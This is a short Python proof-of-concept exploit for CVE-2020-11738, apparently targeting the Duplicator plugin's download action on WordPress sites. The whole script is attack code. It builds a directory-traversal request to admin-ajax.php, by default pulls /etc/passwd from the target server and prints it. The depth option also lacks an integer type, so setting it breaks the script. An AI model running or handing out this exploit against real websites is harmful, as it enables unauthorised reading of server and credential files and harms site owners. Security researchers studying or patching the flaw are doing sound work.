import requests
import argparse


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2020-11738 PoC")
    parser.add_argument("-u", help = "url of the website, eg: http://wordpress.local/", required=True)
    parser.add_argument("-f", help="the absolute path of the file to be downloaded", required=False, default="/etc/passwd")
    parser.add_argument("-d", help="the traversal depth to reach the root folder", required=False, default=7)
    args = parser.parse_args()

    depth = ''.join(['../'*max(args.d,7)])

    try:
        r = requests.get(args.u+"/wp-admin/admin-ajax.php?action=duplicator_download&file="+depth+args.f)
        print(r.text)
    except:
        print("Connection Error!")
